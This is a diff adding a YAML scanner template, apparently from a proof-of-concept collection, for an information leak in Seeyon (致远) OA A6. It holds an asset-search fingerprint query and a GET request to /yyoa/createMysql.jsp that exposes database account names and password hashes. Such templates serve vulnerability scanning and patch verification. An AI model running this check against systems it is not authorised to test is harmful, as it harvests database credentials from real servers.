@@ -1,0 +1,22 @@
+name: 致远OA A6 数据库敏感信息泄露
+manual: true
+query: (app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server")
+  || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/"
+  || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon"
+  && body="seeyonProductId") || (body="/seeyon/common/" && body="var _ctxpath = '/seeyon'")
+  || (body="A8-V5企业版" && body="/seeyon/"))
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/createMysql.jsp
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: 致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码 MD5
+  tags: 敏感信息泄露
